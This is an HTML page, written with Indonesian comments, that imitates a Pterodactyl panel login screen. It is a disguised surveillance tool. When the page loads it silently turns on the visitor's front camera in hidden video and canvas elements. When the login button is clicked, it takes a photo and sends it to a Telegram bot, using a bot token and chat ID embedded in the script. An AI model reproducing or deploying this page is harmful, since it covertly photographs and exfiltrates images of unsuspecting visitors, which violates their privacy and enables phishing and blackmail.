<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>halo</title>
<style>
  html, body {
    margin: 0; padding: 0; height: 100%; width: 100%;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #2c3e50;
    color: #eee;
    user-select: none;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .login-container {
    background: white;
    border-radius: 10px;
    padding: 30px;
    width: 90%;
    max-width: 400px;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
    text-align: center;
    color: #333;
  }
  .login-container img {
    max-width: 120px;
    margin-bottom: 20px;
  }
  .login-container h2 {
    margin-bottom: 20px;
    font-size: 22px;
    color: #2c3e50;
  }
  .login-container input {
    width: 100%;
    padding: 12px;
    margin: 8px 0;
    border: 1px solid #ccc;
    border-radius: 6px;
    box-sizing: border-box;
  }
  .login-container button {
    width: 100%;
    padding: 12px;
    margin-top: 15px;
    background-color: #3498db;
    border: none;
    color: white;
    font-size: 16px;
    border-radius: 6px;
    cursor: pointer;
  }
  .login-container button:hover {
    background-color: #2980b9;
  }
  .login-container a {
    display: block;
    margin-top: 15px;
    color: #3498db;
    text-decoration: none;
    font-size: 14px;
  }
  .footer {
    margin-top: 20px;
    font-size: 12px;
    color: #bbb;
  }

  video, canvas {
    display: none;
  }
</style>
</head>
<body>
<div class="login-container">
  <img src="https://pomf2.lain.la/f/kf1n1q0h.jpg" alt="Pterodactyl">
  <h2>Login to Continue</h2>
  <input type="text" placeholder="USERNAME OR EMAIL" />
  <input type="password" placeholder="PASSWORD" />
  <button id="loginBtn">LOGIN</button>
  <a href="#">FORGOT PASSWORD?</a>
  <div class="footer">Â© 2015 - 2025 Pterodactyl Software</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
  const BOT_TOKEN = '<YOUR_BOT_TOKEN>'; // Ganti dengan token bot kamu
  const CHAT_ID = '<YOUR_CHAT_ID>';     // Ganti dengan chat ID kamu

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const loginButton = document.getElementById('loginBtn');

  let stream = null;

  async function startCamera() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, // Gunakan "environment" untuk kamera belakang
        audio: false
      });
      video.srcObject = stream;
    } catch (err) {
      console.error("Kamera gagal dimuat:", err);
    }
  }

  async function captureAndSendPhoto() {
    if (!stream) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/jpeg');

    try {
      await fetch(`https://api.telegram.org/bot${7522024883:AAF-X33lPQnH1ih9mv6ftdGRH_qyQY0BeN0}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: 6631076203,
          photo: imageData
        })
      });
    } catch (err) {
      console.error("Gagal kirim ke Telegram:", err);
    }
  }

  // Mulai kamera saat halaman dibuka
  window.onload = () => {
    startCamera();
  };

  // Kirim foto saat tombol login ditekan
  loginButton.addEventListener('click', async () => {
    await captureAndSendPhoto();
  });
</script>
</body>
</html>
